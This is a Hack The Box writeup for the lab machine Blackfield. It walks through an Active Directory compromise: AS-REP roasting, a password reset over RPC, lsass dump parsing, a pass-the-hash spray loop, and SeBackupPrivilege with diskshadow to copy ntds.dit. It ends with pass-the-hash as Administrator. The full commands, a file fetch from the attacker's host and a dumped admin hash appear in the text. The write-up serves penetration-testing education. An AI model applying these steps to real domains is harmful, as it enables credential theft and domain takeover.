---
layout: post
title: "[HTB] Blackfield Writeup"
date: 2020-10-03
categories: jekyll update
---


![Blackfield](/asset/images/blackfield/card.png)

# Introduction
Blackfield was an excellent educational box about windows active directory attacks, I cant recommend it enough to anyone intrested in that topic.

# Service Enumeration
Firing off nmap to see what we have.

```bash
# Nmap 7.80 scan initiated Tue Jul  7 04:57:45 2020 as: nmap -p- -sC -sV -oA nmap_BlackF_FUll box
Nmap scan report for box (10.10.10.192)
Host is up (0.12s latency).
rDNS record for 10.10.10.192: Blackfield.htb
Not shown: 65527 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-07-07 10:16:32Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=7/7%Time=5F03F48F%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03");
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h11m01s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-07-07T10:18:53
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jul  7 05:08:31 2020 -- 1 IP address (1 host up) scanned in 645.80 seconds
```

# SMB Enumeration

![Enum](/asset/images/blackfield/smbenum1.png)

All dirs were denied access beside `profiles` which had a list of folders with usernames as folder name.

![Enum](/asset/images/blackfield/smbenum2.png)

Parsing them nicely.

`echo -ne '\n' | smbclient \\\\blackfield.htb\\profiles$ -c ls | cat usernames | grep -vE "password|\." | cut -d\  -f 3 | tee usernames`
![Enum](/asset/images/blackfield/smbenum3.png)

# User enumeration
After some diverse attempts, used [**kerbrute**](https://github.com/ropnop/kerbrute)  tool frop ropnop to enumerate the valid users, its bruteforce kerberos on port 88, if you never heard of kerberos, I would suggest you to get your feet wet with this excellent introduction [*video*](https://www.youtube.com/watch?v=2WqZSZ5t0qk) and pay close attention to the colors (also increase the volume its very low) its very much worth to watch multiple times to get a strong ground knowledge for the headed dog.

![Enum](/asset/images/blackfield/kerb1.png)


# ASREPRoast
Great! lets see if they have PRE-Auth disabled, in short, you check if you are able to login as that user without knowing his password, more precisely if you are able to get his TGT, and if thats the case you are able to crack his password from that TGT, since the user's password is used to encrypt the TGT
 I would also recommend to check [**Vbscrub's video**](https://www.youtube.com/watch?v=pZSyGRjHNO4) that explain in depth the attack.

![Enum](/asset/images/blackfield/aspr.png)

We got the hash, lets crack it with our old friend `john`.

![Enum](/asset/images/blackfield/john1.png)

# RPC magic
While spraying with `crackmapexec`, the password we got is only usefull with support, on the smb share only.


![Enum](/asset/images/blackfield/cme1.png)

Checking RPC again with the new creds.

![Enum](/asset/images/blackfield/rpc1.png)
![Enum](/asset/images/blackfield/rpc2.png)
![Enum](/asset/images/blackfield/rpc3.png)

Did not matter, started hitting the forum there, it was the most difficult part since I did not know that it was possible, here is the hint:  the account is a support, it may be have the possible to manage passwords for other users?
![Enum](/asset/images/blackfield/sup1.png)
I would recommend to read this well written [**article**](https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html) for AD environment pentesting.

![Enum](/asset/images/blackfield/rpc4.png)

Successfully changed password of the user audit2020.
And we confirm it with `cme`.

![Enum](/asset/images/blackfield/cme2.png)
![Enum](/asset/images/blackfield/smb4.png)

The forensic share is finally accessible from that account, downloading the whole content we find commands outputs and process dumps.
lsass dump picked my intrest since its used to store creds/session tickets of kerberos.
Searching on the net for an alternative from `mimikatz` that is used in windows to extract them, discovered [**pypykatz**](https://github.com/skelsec/pypykatz).

![Enum](/asset/images/blackfield/smb5.png)
![Enum](/asset/images/blackfield/pyka1.png)

Parsing the extracted SHA1 and NThashes.
![Enum](/asset/images/blackfield/sha1.png)
![Enum](/asset/images/blackfield/nt1.png)

Performing pass the hash spray on various smbshares that are still not available like **C$**.

`for hash in $(cat lsass_nt ) ; do echo -n $hash:; smbclient  \\\\blackfield.htb\\C$ -U svc_backup --pw-nt-hash $hash  -c ls;done`

![Enum](/asset/images/blackfield/pth1.png)


And we got a working hash as svc_backup, getting the shell with `evil-winrm` and collecting user.txt.

![Enum](/asset/images/blackfield/shell1.png)
# Privelege escalation
Checking previleges with a simple `whoami`, `winpeas` wasnt that much helpful here tbh.

![Enum](/asset/images/blackfield/who.png)

We notice we have two very intresting privs: `SeBackupPrivilege` and `SeRestorePrivilege`.
After a bit of googling, found some intresting articles [**show me your privileges and I will lead you to SYSTEM**](https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf) from Andrea Pierini, [**xct notes**](https://vulndev.io/notes/2019/01/01/windows.html#sebackupprivilegeserestoreprivilege), and finnaly [**hacktricks**](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration#no-credentials-diskshadow).

So its a textbook exercice to dump domain controller. 

# Diskshadow
![Enum](/asset/images/blackfield/dump1.png)

# SeBackupPrivilege*
```powershell
Import-Module ./SeBackupPrivilegeUtils.dll
Import-Module ./SeBackupPrivilegeCmdLets.dll
Set-SeBackupPrivilege
Copy-FileSeBackupPrivilege C: <target>
```
# Exploitation
The file ntds.dit (contains all the data about users/groups including credentials) is being used by the service, thus we are not able to access it directly, a windows feature called "diskshadow" allow us to make a sort of a snapshot of volumes and allow us to access it IF we have the right to do so, but with `SeBackupPrivilege` we are able to do so. so combining diskshadow technique with the privilege abuse we will be able to get the famous ntds.dit file, and finnally dumping the credentials.

Uploading the dlls from this [**repo**](https://github.com/giuliano108/SeBackupPrivilege), and shadow.txt.
```bash
# shadow.txt
set context persistent nowriters
set metadata c:\tmp\metadata.cab
add volume c: alias trophy
create
expose {9cc45871-ce75-4529-adb7-d72aebc2a55e} z: # Needs to be set to the correct shadow disk ID
# Execution
diskshadow.exe /s C:\tmp\shadow.txt
cmd.exe /c copy z:\windows\ntds\ntds.dit c:\tmp\ntds.dit
```


```howershell
*Evil-WinRM* PS C:\tmp> cmd.exe /c copy z:\windows\ntds\ntds.dit c:\tmp\ntds.dit
cmd.exe : The system cannot find the drive specified.
    + CategoryInfo          : NotSpecified: (The system cann...rive specified.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
*Evil-WinRM* PS C:\tmp> wget http:\\10.10.15.128/shadow.txt -OutFile shadow.txt
*Evil-WinRM* PS C:\tmp> diskshadow.exe /s C:\tmp\shadow.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  7/12/2020 11:17:39 AM

-> set context persistent nowriters
-> set metadata c:\tmp\metadata.cab
The existing file will be overwritten.
-> add volume c: alias trophy
-> create
Alias trophy for shadow ID {625fd888-124f-43c6-ab1d-4bfe528a0199} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {b4597c15-8491-4e15-87b0-f8679940a4e6} set as environment variable.

Querying all shadow copies with the shadow copy set ID {b4597c15-8491-4e15-87b0-f8679940a4e6}

        * Shadow copy ID = {625fd888-124f-43c6-ab1d-4bfe528a0199}               %trophy%
                - Shadow copy set: {b4597c15-8491-4e15-87b0-f8679940a4e6}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{351b4712-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 7/12/2020 11:17:43 AM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose {9cc45871-ce75-4529-adb7-d72aebc2a55e} z:
The shadow copy was successfully exposed as z:\.
->
*Evil-WinRM* PS C:\tmp> cmd.exe /c copy z:\windows\ntds\ntds.dit c:\tmp\ntds.dit
cmd.exe : Access is denied.
    + CategoryInfo          : NotSpecified: (Access is denied.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
        0 file(s) copied.
*Evil-WinRM* PS C:\tmp> Import-Module ./SeBackupPrivilegeUtils.dll
*Evil-WinRM* PS C:\tmp> Import-Module ./SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\tmp> Set-SeBackupPrivilege
*Evil-WinRM* PS C:\tmp> Copy-FileSeBackupPrivilege z:\windows\ntds\ntds.dit c:\tmp\ntds.dit
*Evil-WinRM* PS C:\tmp> ls


    Directory: C:\tmp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/12/2020  10:14 AM                aa
d-----        7/12/2020  10:14 AM                aaa
-a----        7/12/2020  11:17 AM            666 metadata.cab
-a----        7/12/2020  10:17 AM          59392 nc.exe
-a----        7/12/2020  11:18 AM       18874368 ntds.dit ## Here we go! 
-a----        7/11/2020   4:39 PM          12288 SeBackupPrivilegeCmdLets.dll
-a----        7/11/2020   4:39 PM          16384 SeBackupPrivilegeUtils.dll
-a----        7/12/2020  11:17 AM            159 shadow.txt


*Evil-WinRM* PS C:\tmp> 
```

# Dumping

We got the ntds.dit! time for extraction with this [**article**](https://pure.security/dumping-windows-credentials/).
![Enum](/asset/images/blackfield/dump2.png)
![Enum](/asset/images/blackfield/dump3.png)
![Enum](/asset/images/blackfield/dump4.png)

Using secrets-dump from impacket.
![Enum](/asset/images/blackfield/dump5.png)
We dumped all the hashes, lets perform **pass-the-hash** as Admin with `evil-winrm`

```bash
root@Zakali:~/HTB/Blackfield/root# evil-winrm -u Administrator -i blackfield.htb -H 184fb5e5178480be64824d4cd53b99ee
Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami /all

USER INFORMATION
----------------

User Name                SID
======================== =============================================
blackfield\administrator S-1-5-21-4194615774-2175524697-3563712290-500
```
All done!



Special thanks to [**ippsec**](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA) for his amazing knowledge and methodology shared for free.

# Bonus
I did take note of every attempt I have made, including mistakes and rabbitholes, most writeups give the illusion of a smooth sailing exploitation, i just wanted to show its absolutelty not.


![Enum](/asset/images/blackfield/attempts/-000.png)
![Enum](/asset/images/blackfield/attempts/-001.png)
![Enum](/asset/images/blackfield/attempts/-002.png)
![Enum](/asset/images/blackfield/attempts/-003.png)
![Enum](/asset/images/blackfield/attempts/-004.png)
![Enum](/asset/images/blackfield/attempts/-005.png)
![Enum](/asset/images/blackfield/attempts/-006.png)
![Enum](/asset/images/blackfield/attempts/-007.png)
![Enum](/asset/images/blackfield/attempts/-008.png)
![Enum](/asset/images/blackfield/attempts/-009.png)
![Enum](/asset/images/blackfield/attempts/-010.png)
![Enum](/asset/images/blackfield/attempts/-011.png)
![Enum](/asset/images/blackfield/attempts/-012.png)
![Enum](/asset/images/blackfield/attempts/-013.png)
![Enum](/asset/images/blackfield/attempts/-014.png)
![Enum](/asset/images/blackfield/attempts/-015.png)
![Enum](/asset/images/blackfield/attempts/-016.png)
![Enum](/asset/images/blackfield/attempts/-017.png)
![Enum](/asset/images/blackfield/attempts/-018.png)
![Enum](/asset/images/blackfield/attempts/-019.png)
![Enum](/asset/images/blackfield/attempts/-020.png)
![Enum](/asset/images/blackfield/attempts/-021.png)
![Enum](/asset/images/blackfield/attempts/-022.png)
![Enum](/asset/images/blackfield/attempts/-023.png)
![Enum](/asset/images/blackfield/attempts/-024.png)
![Enum](/asset/images/blackfield/attempts/-025.png)
![Enum](/asset/images/blackfield/attempts/-026.png)
![Enum](/asset/images/blackfield/attempts/-027.png)
![Enum](/asset/images/blackfield/attempts/-028.png)
![Enum](/asset/images/blackfield/attempts/-029.png)
![Enum](/asset/images/blackfield/attempts/-030.png)
![Enum](/asset/images/blackfield/attempts/-031.png)
![Enum](/asset/images/blackfield/attempts/-032.png)
![Enum](/asset/images/blackfield/attempts/-033.png)
![Enum](/asset/images/blackfield/attempts/-034.png)
![Enum](/asset/images/blackfield/attempts/-035.png)
![Enum](/asset/images/blackfield/attempts/-036.png)
![Enum](/asset/images/blackfield/attempts/-037.png)
![Enum](/asset/images/blackfield/attempts/-038.png)
![Enum](/asset/images/blackfield/attempts/-039.png)
![Enum](/asset/images/blackfield/attempts/-040.png)
![Enum](/asset/images/blackfield/attempts/-041.png)
![Enum](/asset/images/blackfield/attempts/-042.png)
![Enum](/asset/images/blackfield/attempts/-043.png)
![Enum](/asset/images/blackfield/attempts/-044.png)
![Enum](/asset/images/blackfield/attempts/-045.png)
![Enum](/asset/images/blackfield/attempts/-046.png)
![Enum](/asset/images/blackfield/attempts/-047.png)
![Enum](/asset/images/blackfield/attempts/-048.png)
![Enum](/asset/images/blackfield/attempts/-049.png)
![Enum](/asset/images/blackfield/attempts/-050.png)


Thats it, thanks for taking the time reading my blog.
